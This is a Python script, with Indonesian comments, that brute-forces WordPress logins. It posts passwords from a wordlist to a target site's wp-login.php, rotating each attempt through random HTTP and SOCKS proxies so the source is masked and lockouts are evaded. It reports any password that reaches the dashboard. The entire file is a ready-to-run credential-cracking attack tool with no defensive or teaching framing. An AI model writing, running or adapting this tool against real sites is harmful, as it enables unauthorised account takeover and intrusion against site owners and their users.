# python/wp_bruteforce_proxy.py
import sys
import json
import requests
import random
import logging
from urllib.parse import urljoin
from time import sleep
from requests.exceptions import RequestException

# Setup logging
logging.basicConfig(
    filename='wp_bruteforce.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def load_proxies(proxy_files):
    proxies = []
    for file, ptype in proxy_files.items():
        try:
            with open(f"python/{file}", 'r') as f:
                for line in f:
                    proxy = line.strip()
                    if proxy:
                        proxies.append({
                            'type': ptype,
                            'proxy': proxy
                        })
        except Exception as e:
            logging.error(f"Gagal baca {file}: {str(e)}")
    return proxies

def wp_bruteforce(url, username, wordlist_path, proxy_files):
    results = {
        "url": url,
        "username": username,
        "password_found": None,
        "proxies_used": [],
        "errors": []
    }

    try:
        # Load proxies
        proxies = load_proxies(proxy_files)
        if not proxies:
            raise ValueError("Tidak ada proxy yang valid")
            
        # Load wordlist
        with open(wordlist_path, 'r') as f:
            passwords = f.read().splitlines()

        login_url = urljoin(url, "/wp-login.php")
        
        for password in passwords:
            proxy = random.choice(proxies)
            proxy_dict = {}
            
            try:
                if proxy['type'] == 'http':
                    proxy_dict = {'http': f"http://{proxy['proxy']}"}
                elif proxy['type'] in ['socks4', 'socks5']:
                    proxy_dict = {
                        'http': f"{proxy['type']}://{proxy['proxy']}",
                        'https': f"{proxy['type']}://{proxy['proxy']}"
                    }

                session = requests.Session()
                session.proxies = proxy_dict
                
                # Brute force attempt
                response = session.post(
                    login_url,
                    data={'log': username, 'pwd': password},
                    timeout=30
                )
                
                results['proxies_used'].append(proxy['proxy'])
                
                if 'dashboard' in response.url:
                    results['password_found'] = password
                    break

            except RequestException as e:
                error = f"Proxy {proxy['proxy']} error: {str(e)}"
                results['errors'].append(error)
                logging.error(error)
                continue
                
            sleep(5)  # Jeda antar percobaan

        return results

    except Exception as e:
        results['errors'].append(str(e))
        return results

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(json.dumps({"error": "Argumen tidak lengkap"}))
        sys.exit(1)

    proxy_files = {
        "http.txt": "http",
        "socks4.txt": "socks4",
        "socks5.txt": "socks5"
    }
    
    print(json.dumps(wp_bruteforce(
        sys.argv[1],  # URL
        sys.argv[2],  # Username
        sys.argv[3],  # Wordlist path
        proxy_files
    )))